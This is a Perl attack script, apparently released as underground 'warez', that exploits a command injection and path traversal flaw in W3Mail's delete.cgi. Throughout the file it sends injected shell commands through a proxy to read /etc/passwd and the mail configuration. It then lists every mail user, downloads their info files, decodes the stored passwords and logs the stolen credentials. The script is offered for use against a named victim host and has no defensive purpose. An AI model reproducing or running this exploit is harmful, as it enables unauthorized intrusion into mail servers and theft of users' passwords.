#!/usr/bin/perl

#     defaced staff private warez
#    W3Mail ripping toolkit v 1.0.9_full
#      < w3mail-grob.pl - grabber >
#
# this ware grabs users datebase from W3Mail system
#

# CONFIG

# victim host
$host = "www.microsoft.com";
# proxy IP
$proxy_host = "148.24.1.5";
# proxy PORT
$proxy_port = 8080;
# path to delete.cgi
$path = "/cgi-bin/w3mail/delete.cgi";

$verbose = 1;          # DUMP all grabbed info (like configz) in files
$grab_passwd = 0;      # only get /etc/passwd
$dont_grab_config = 1; # use manually-edited config
$confpath = "";        # set manually path to w3mail config file

# END OF CONFIG

use Socket;

print " -== W3Mail ripping toolkit v 1.0.6 ==-\n";

$w3conf = "w3mail.conf";
$query = "user=..\\&pass=1\\&isLogin=3\\&SessionID=66\\&servname=..\\";
$query .= "&folder=..\\&msgnum=\x253B";

chdir("bases/");
mkdir($host);
chdir($host);

$header = "POST http://${host}${path} HTTP/1.1\r\n";
$header .= "Host: ${host}\r\n";
# $header .= "Connection: close\r\n";
$header .= "Content-Type: application/x-www-form-urlencoded\r\n";

# get /etc/passwd
InitConnect();
send(CON, $header, 0);
$str = "${query}cat\x2520/etc/passwd\x2500";
send(CON, "Content-Length: ".length($str)."\r\n\r\n",0);
send(CON, $str, 0);

do { @page = <CON>; } while(<CON>);
close(CON);

open(PASS, ">000_PASSWD");

$numb = 0;
$pwdf[0] = ""; # init array for passwd file
@tmper = @page;

for ($z = 2; $z <= $#tmper; $z++)
{
  chomp $tmper[$z];

  if ($tmper[$z] =~ m/Content-type/i){ next; }

  if ($tmper[$z] =~ m/\x3a/ && $tmper[$z] =~ m/\x2f/ &&
    $tmper[$z] !~ m/\x3c/ && $tmper[$z] =~ m/\w+/)
  {
    print PASS "$tmper[$z]\n";
    $pwdf[$numb] = $tmper[$z];
    $numb = $numb+1;
  }
}
close(PASS);

print "[+] Got /etc/passwd with $numb records in it\n";

if ($grab_passwd == 1)
{
  print "press any key\n";
  $a = <>;
  exit;
}

# grab config
if ($dont_grab_config == 0)
{
  InitConnect();
  send(CON, $header, 0);

  if (length($confpath) < 1){
    $str = "${query}cat\x2520${w3conf}\x2500";
    print "[+] using config ${w3conf}\n";
  } else {
    $str = "${query}cat\x2520${confpath}\x2500";
    print "[+] using config ${confpath}\n";
  }
 
  send(CON, "Content-Length: ".length($str)."\r\n\r\n",0);
  send(CON, $str, 0);

  do { @page = <CON>; } while(<CON>);
  close(CON);

  open(DUMP, ">${w3conf}");

  foreach $line (@page)
  {
    chomp $line;

    if ($line !~ m/\x3c/ && $line !~ m/\x3e/ && $line =~ m/\x3b/)
    { print DUMP "$line\n"; }
  }
  close(DUMP);
}

require $w3conf; # supa-hint!

print "[+] connected done, got config\n";
print "[+] datadir: $datadir\n";

open(LOGF, ">000_LOGFILE");

# count servers
foreach $serv (@mailservers)
{
   chomp $serv;
   print "[+] checking $serv\n";
   print LOGF "[+] grabbing log $serv\n";

   socket(CON2, AF_INET, SOCK_STREAM, 0);
   connect(CON2, sockaddr_in($proxy_port, inet_aton($proxy_host)));
   send(CON2, $header, 0);

   $tmp = "ls\x2b${datadir}/${serv}/\x2b\x2500";
   $tmp =~ s/\x2f/\x25\x32\x66/g;
   $str = $query.$tmp;

   send(CON2, "Content-Length: ".length($str)."\r\n\r\n", 0);
   send(CON2, $str."\r\n\r\n", 0);

   do { @page = <CON2>; } while(<CON2>);
   close(CON2);
   
   @tmpr = @page;

   $cnt = 1;
   $all = 0;
   $crc = 0;

   foreach $line (@tmpr)
   {
     chomp $line;
     if ((length($line) > 0) && $line !~ m/\x3c/ &&
      $line !~ m/\x3e/ && $line =~ m/\w+/ &&
      $line !~ m/\x2f/ && $line !~ m/\x2e/)
     { $all = $all+1; }
   }

   # grab personal info..
   for ($li = 2; $li < $#page; $li++)
   {
     chomp $page[$li];

     if (length($page[$li]) > 0 && $page[$li] !~ m/\x3c/ &&
     $page[$li] !~ m/\x3e/ && $page[$li] =~ m/\w+/ &&
     $page[$li] !~ m/\x2f/ && $page[$li] !~ m/\x2e/)
     {
       $user = $page[$li];
       printf("%-20s %40s\n","[+] own $user",
         "$cnt of $all (cracked: $crc)");
       InitConnect();
       send(CON, $header, 0);

       $tmp = "cat\x2520${datadir}/${serv}/${user}/info\x2500";
       $tmp =~ s/\x2f/\x25\x32\x66/g;
       $str = $query.$tmp;
       send(CON, "Content-Length: ".length($str)."\r\n\r\n",0);
       send(CON, $str, 0);

       do { @infa = <CON>} while (<CON>);
       close(CON);

       open(TF,">${serv}_${user}");

       foreach $st (@infa)
       {
         chomp $st;

         if ($st =~ m/\x3b/ && $st =~ m/\x24/)
         {
           print TF "$st\n";

           if ($st =~ m/ncpass/)     # grab and decrypt password
           {
             ($a,$b,$c) = split(/\x22/,$st);
             $pwd = decode_base64($b);
             print "  password cracked: $pwd\n";
             $crc = $crc+1;
             print LOGF "cracked: ${user}:${pwd}\n";

             if (defined($check_sh))
             {

               foreach $usrec (@pwdf)
               {
                 @reca = split(/\x3a/, $usrec);
                 # user:x:uid:gid:infa:/home/dir:/some/shell
                 if ($reca[0] ne $user){ next; }
                 print "  got shell: $reca[6]\n";
               }
             } # endif
           }
         }
       }

       close(TF);
       $cnt++;
     }
   }
}

print "[+] done\n";
close(LOGF);
print "\npress any key\n";
$a = <>;
exit;

# some subs here...

sub InitConnect {

  socket(CON, AF_INET, SOCK_STREAM, 0);

  if (!connect(CON, sockaddr_in($proxy_port, inet_aton($proxy_host))) ){
     print "[-] cant connect to proxy\n";
     close(LOGF);
     exit;
  }

}

sub decode_base64 ($)
{
    local($^W) = 0; # unpack("u",...) gives bogus warning in 5.00[123]

    my $str = shift;
    $str =~ tr|A-Za-z0-9+=/||cd;    # remove non-base64 chars
    if (length($str) % 4) {
      print("error: bad base64 hash!\n");
    }
    $str =~ s/=+$//;            # remove padding
    $str =~ tr|A-Za-z0-9+/| -_|;    # convert to uuencoded format

    return join'', map( unpack("u", chr(32 + length($_)*3/4) . $_),
        $str =~ /(.{1,60})/gs);
}


# end of subs
